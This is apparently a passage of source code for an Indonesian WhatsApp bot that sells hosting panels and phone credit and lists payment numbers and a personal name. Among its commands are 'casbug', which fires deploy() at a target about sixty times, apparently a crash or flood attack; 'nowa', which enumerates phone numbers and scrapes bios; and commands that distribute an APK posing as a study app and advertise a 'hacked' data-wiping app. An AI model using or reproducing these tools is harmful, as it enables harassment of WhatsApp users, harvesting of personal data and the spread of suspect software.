if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Ini Node Modules Nya
https://www.mediafire.com/file/58666446453v8qz/nodemodules+hw.tar.gz/file`)
}
break

//=================================================//
case 'confirm_pulsa': {
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Silahkan Ketik ${command} Pulsa *nominal 62nomermu\n\nContoh : ${command} Pulsa 7k 6288888`)
Pe = text.split(" ")[0]+'@s.whatsapp.net'
let teks = `${q}`
kesper.sendMessage(Pe,
{ text: `Terkonfirmasi Silahkan Tunggu Pulsa Masuk`}, {quoted : exe})
}
break
case 'done_pulsa': {
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Silahkan Ketik ${command} Panel 1gb\n\nContoh : ${command} Panel 1gb/ ${command} pulsa 7k Sertakan Nomormu agar owner mengetahui‼`)
let teks = `${q}`
kesper.sendMessage(6288985180344 + "@s.whatsapp.net",
{ text: `Orderan : ${q}`,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://retslav.xyz/`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
await sleep(2000)
kesper.sendMessage(m.chat,
{ text: `Pesanan Sudah Terkirim Tunggu Sampai Owner Menjawab\nNote : Sertakan Nomor Mu Agar Owner Menjawab‼`}, {quoted : exe})
}
break
case 'donetrx': {
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Silahkan Ketik ${command} Panel 1gb\n\nContoh : ${command} Panel 1gb / ${command} pulsa 7k Sertakan Nomormu agar owner mengetahui‼`)
let teks = `${q}`
kesper.sendMessage(62882003133773 + "@s.whatsapp.net",
{ text: `Orderan : ${q}\n\nJika Terkonfirmasi Silahkan Ketik Username Dan Pasword Contoh Confirm 62xxx Username : xxx Password : xxx\n\n\nCreate Accoun't : https://retslav.xyz/`,
}, { quoted:exe})
await sleep(2000)
kesper.sendMessage(m.chat,
{ text: `Pesanan Sudah Terkirim Tunggu Sampai Owner Menjawab\nNote : Sertakan Nomor Mu Agar Owner Menjawab‼`}, {quoted : exe})
}
break
case 'casbug': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
deploy(`${q}`)
await sleep(5000)
}
}
break
case 'confirm': {
if (!isCreator) return m.reply('Lu Siapa Kontol')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Silahkan Ketik ${command} 62nomornya\n\nUsername: xxx\n\nPassword: xxx\n\nLogin: https://xxxx`)
Pe = text.split(" ")[0]+'@s.whatsapp.net'
let teks = `${q}`
kesper.sendMessage(Pe,
{ text: `Terkonfirmasi\n\nPesan Owner : ${q}`}, {quoted : m})
}
break
case 'panel4': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `⚡4GB RAM/4GB Disk/100% CPU

Price : Rp25.000,00

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773\n\nJika Sudah Silahkan Kirim Bukti Transfer Dengan Prefix Donetrx panel 4gb 62nomormu`,
 })
}
break
case 'panel3': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `⚡3GB RAM/3GB Disk/75% CPU

Price : Rp20.000,00

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773\n\nJika Sudah Silahkan Kirim Bukti Transfer Dengan Prefix Donetrx panel 3gb 62nomormu`,
})
}
break
case 'panel2': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `⚡2GB RAM/2GB Disk/50% CPU

Price : Rp15.000,00

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773\n\nJika Sudah Silahkan Kirim Bukti Transfer Dengan Prefix Donetrx panel 2gb 62nomormu`,
})
}
break
case 'panel1': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `⚡1GB RAM/1GB Disk/25% CPU

Price : Rp10.000,00

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773\n\nJika Sudah Silahkan Kirim Bukti Transfer Dengan Prefix Donetrx panel 1gb 62nomormu`,
})
}
break
case 'panel':
touchmebree = [
{
title: `*Price List*`,
rows: [
 {title: `⚡1GB RAM/1GB Disk/25% CPU`, rowId: `panel1`, description: `Rp10.000,00`},
  {title: `⚡2GB RAM/2GB Disk/50% CPU`, rowId: `panel2`, description: `Rp15.000,00`},  
    {title: `⚡3GB RAM/3GB Disk/75% CPU`, rowId: `panel3`, description: `Rp20.000,00`},
    {title: `⚡4GB RAM/4GB Disk/100% CPU`, rowId: `panel4`, description: `Rp25.000,00`}
]
}
]
kesper.sendListMsg(m.chat, `
List Pannel

Note:
Melakukan pembelian artinya anda setuju dengan segala kebijakan kami.

`, kesper.user.name, `Hay Kak List Panel Ada Di Sini`, `Click Here`, touchmebree, m)
break
//=============================//
case 'pulsa4': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `Pulsa : Rp20.000

Price : Rp22.000

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773

Jika Sudah Ketik Donetrx`,
})
}
break
case 'pulsa3': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `Pulsa : Rp15.000

Price : Rp17.000

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773

Jika Sudah Ketik Donetrx`,
})
}
break
case 'pulsa2': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `Pulsa : Rp10.000

Price : Rp12.000

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773

Jika Sudah Ketik Donetrx`,
})
}
break
case 'pulsa1': {
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { 
text: `Pulsa : Rp5.000

Price : Rp7.000

Silahkan Lakukan Pembayaran Ke Nomor Ini

GOPAY = 0882003133773
DANA = 0882003133773

Jika Sudah Ketik Donetrx`,
})
}
break
case 'pulsa':
touchmebree = [
{
title: `*Price List*`,
rows: [
 {title: `Pulsa : Rp5.000`, rowId: `pulsa1`, description: ` Harga : Rp7.000`},
  {title: `Pulsa : Rp10.000`, rowId: `pulsa2`, description: `Harga : Rp12.000`},  
    {title: `Pulsa : Rp15.000`, rowId: `pulsa3`, description: `Harga : Rp17.000`},
    {title: `Pulsa : Rp20.000`, rowId: `pulsa4`, description: `Harga : Rp22.000`}
]
}
]
kesper.sendListMsg(m.chat, `

Beli Pulsa Murah Coy Cuma Di Sini😱

`, kesper.user.name, `Hay Kak List Harga Ada Di Sini`, `Click Here`, touchmebree, m)
break
//=================================================//
case 'payment': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

RINA AFRIANI
gopay : nul
Dana : 085771061154`)
}
break
//=================================================//
case 'tutorial': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//
case '5000': case '7k':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+5000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '10000': case '12k': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+10000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '15000': case '16k': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+15000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '20000': case '22k': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+20000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '25000': case '25k': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+25000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '30000': case '31k': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+300000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '50000': case '51k': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+50000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '100000': case'99k':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+100000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '150000': case '147k':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+150000

gopay : 085771061154
Dana : 085771061154`)
}
break
case '200000': case '195k':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/62882003133773?text=Beli+Pulsa+Mas+Yang+200000

gopay : 085771061154
Dana : 085771061154`)
}
break
//=================================================//
case 'belajarkita': {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ah3W96XRKFP1U7LSM1DvTeP81MpC75EBgDUYYQt9B5mF.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Belajar Bersama_1.11.apk",
"fileSha256": "PdBsdG3dTVg+CAiJJzqlcU/Wc1DHAloGQKV0n5vo30s=",
"fileLength": "7249993",
"pageCount": 0,
"mediaKey": "wnhI3PodfZqLKQbbEBQFYBxlb7n1WBhwWbPfuPQJm/8=",
"fileName": "Belajar Bersama_1.11.apk",
"fileEncSha256": "LAmKijY7XCKJrONV0cBXPiCNVYJdYLMjMOsi+q4pd2g=",
"directPath": "/v/t62.7119-24/34960356_543134977691326_1792059771773909536_n.enc?ccb=11-4&oh=01_AdQHN60wPp2-oLvINncKbeOse99hDWzyfjN2G4S0G4kr1g&oe=63C591FA",
"mediaKeyTimestamp": "1671207354",
"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Casper Aman Dan Terpercaya Selamat Belajar ❤️",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply('sukses Kirim Script')
}
break
//=================================================//
case 'jasarun': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Hello Kamu Malas Upload Script Ke Panel??
Atauu.. Bingung Yah Tenang Ada Kami Jasa Run Bot Via Panel
Kalian Bisa Hubungi Owner Di Bawah..
Harga Tergantung Setiap Owner 😉

Casper-
Wa.me/62882003133773?text=Bang+Jasa+Run`)
}
break
//=================================================//
case 'bagaimanakah':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
kesper.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
kesper.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'cecan1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/6c/59/ee/6c59ee71dd001504309d8fa999419765.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/eb/3d/c2/eb3dc2c7a69abf471127fac837c0ac90.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/e5/5a/20/e55a20a9c762d5578884af81e33ecfff.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/62/b6/37/62b6370726160df92fa26d51df2bb9f5.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/af/ef/ca/afefcafc1ad008cee1021602c05f5986.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan6': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/36/8d/f1/368df1b6fc71343febf89b698d0c1668.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan7': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/db/c7/40/dbc7403ea7d36e5a192008d777293b02.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan8': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/f6/19/b0/f619b02f2ec4b28c152dc0ef02a671f2.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan9': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/b6/7d/15/b67d154789da7138e80179bb03651aec.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan10': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/97/c8/46/97c8460a8e5217239149dd9fa1ca81c3.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan11': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/bd/fd/94/bdfd9417121ccbf52cb9ba83156b005f.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan12': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/e1/37/5b/e1375b427cf9e0c6710e1965490f4057.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan13': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/39/8e/4b/398e4bb0e7ab5e55121b03a24352d0bf.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan14': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/7b/5b/a3/7b5ba32bb7ba1303a824643fdb00be4e.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan15': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/41/5a/9d/415a9dd402305fdae61e081b906bcfa6.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan16': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/72/8e/e4/728ee4c55d857d6c90b39c27a42c9ac9.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan17': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/b8/36/65/b83665498cdc46ba542739e56c43b36a.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan18': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/59/25/07/592507dc13a8355e661eaeb73c442c6c.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan19': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/30/64/90/30649018b4ba4813d03e4c846d8d1ef2.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan20': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/6e/89/57/6e89574602653d1e88227658ff206d82.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
//=================================================//
case 'detectadmin': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
m.reply('Succes menyalakan detect admin di group ini 🌷')
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Mati')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Succes mematikan detect admin di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

//=================================================//
case 'nowa': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await kesper.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await kesper.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'listjualan':
touchmebree = [
{
title: `©️ Casper`,
rows: [
 {title: `APK HACKED `, rowId: `${prefix}apkhack`, description: `Aplikasi Penghapus Data Memory`},
  {title: `APK BEALAJAR `, rowId: `${prefix}belajarkita`, description: `Aplikasi Belajar Bersama`},  
